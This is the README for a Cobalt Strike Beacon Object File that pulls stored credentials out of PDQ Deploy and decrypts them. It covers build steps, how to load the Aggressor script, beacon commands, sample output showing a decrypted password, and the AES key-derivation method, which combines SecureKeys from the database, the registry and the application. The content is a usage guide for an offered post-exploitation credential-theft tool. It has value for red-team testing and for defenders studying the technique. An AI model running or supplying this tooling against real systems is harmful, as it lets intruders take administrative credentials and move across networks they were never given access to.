# PDQ Deploy Credential Recovery

A Beacon Object File (BOF) that extracts and decrypts credentials from PDQ Deploy.

## Overview

This BOF can extract credentials from PDQ Deploy's database and decrypt them using the SecureKeys stored in:
1. The PDQ Deploy application assembly
2. The PDQ Deploy database
3. The Windows registry

## Features

The BOF provides two modes of operation:

1. **Check Mode** - Verifies if the three SecureKeys needed for decryption can be recovered without extracting credentials
2. **Credentials Mode** - Extracts and decrypts credentials from the PDQ Deploy database

## Compilation

### Using Visual Studio
1. Open the Visual Studio solution
2. Build the project in Release configuration
3. The compiled BOF will be in either:
   - `x64/Release/PDQ.o` (for 64-bit)
   - `x86/Release/PDQ.o` (for 32-bit)

### Using Makefile
```bash
# For 64-bit
make

# For 32-bit (if supported)
make x86
```

## File Placement for Aggressor Script

The PDQ BOF and Aggressor script should be organized as follows:

### Option 1: Place BOF in the same directory as the Aggressor script
```
/path/to/scripts/
├── pdq_deploy.cna            # Aggressor script
├── pdq.x64.o                 # 64-bit BOF (rename from PDQ.o)
└── pdq.x86.o                 # 32-bit BOF (optional)
```

### Option 2: Place BOF in subdirectories
```
/path/to/scripts/
├── pdq_deploy.cna            # Aggressor script
├── bin/
│   ├── pdq.x64.o             # 64-bit BOF
│   └── pdq.x86.o             # 32-bit BOF (optional)
└── x64/
    └── pdq.o                 # 64-bit BOF (alternative location)
```

## Manual Usage in Cobalt Strike

```
# Check if SecureKeys can be extracted
beacon> inline-execute /path/to/PDQ.o check

# Extract and decrypt credentials
beacon> inline-execute /path/to/PDQ.o credentials
```

## Using the Aggressor Script

1. Load the `pdq_deploy.cna` script in Cobalt Strike:
   ```
   Cobalt Strike -> Scripts -> Load
   ```

2. Use one of the registered commands:
   ```
   beacon> pdq_check
   beacon> pdq_credentials
   ```

3. Alternatively, use the context menu added to the Beacon menu:
   ```
   [Beacon] -> PDQ Deploy -> Check SecureKeys
   [Beacon] -> PDQ Deploy -> Extract Credentials
   ```

## Troubleshooting

If you encounter errors like:
```
[!] Function call &beacon_inline_execute failed: The BOF content (arg 2) is empty.
```

This means the Aggressor script couldn't locate your compiled BOF file. Try these solutions:

1. Check that you've compiled the BOF correctly
2. Verify the BOF file exists and is not empty
3. Rename your compiled BOF file to match what the script is looking for:
   - `PDQ.o` → `pdq.x64.o` for 64-bit
   - `PDQ.o` → `pdq.x86.o` for 32-bit
4. Place the BOF files in one of the locations checked by the script

The script automatically checks multiple common locations for the BOF file, including:
- Current script directory
- `./bin/` subdirectory
- `./x64/` or `./x86/` subdirectories
- `./dist/` subdirectory
- Absolute path at `c:/bof-vs/PDQ/x64/Release/PDQ.o`

## Command Details

### pdq_check
Checks if the three SecureKeys (application, database, registry) are available without extracting credentials.

Output example:
```
Checking for PDQ Deploy SecureKeys...
DB SecureKey: bd30b186-8ff3-41cc-b73f-82592775f6a8
Registry SecureKey: a7579900-06c4-4a99-9358-0146b6db0bcd
Application SecureKey: 043E2818-3D63-41F9-9803-B03593F33C7D
SUCCESS: All three SecureKeys found. Decryption should be possible.
```

### pdq_credentials
Extracts credentials from the PDQ Deploy database and attempts to decrypt them using the available SecureKeys.

Output example:
```
Valid SQLite DB. Extracting credentials...
UserName: test
EncryptedPasswordBlob: 28656E63727970746564290010D7BF7E901BD8BCF2D69FEF9CBD34430BD2F30B86B947193588E57D78EE4ABCD1
Found 1 credential entry
Found DB SecureKey
Found Registry SecureKey
Found Application SecureKey
Attempting to decrypt 1 credential
Decrypted password for test: TEST
Successfully decrypted 1 of 1 credentials
```

## Technical Details

The BOF uses a combination of the three SecureKeys to decrypt credentials:
1. Extracts GUIDs from the PDQ Deploy database
2. Gets the SecureKey from the Windows registry
3. Searches for GUIDs in the application assembly
4. Combines all keys and uses them for AES-CBC decryption

The decryption follows the same methodology as the Python implementation:
```python
key_hash = hashlib.sha256(key.encode('utf-8')).digest()
aes_key = key_hash[:16]
cipher = AES.new(aes_key, AES.MODE_CBC, iv)
``` 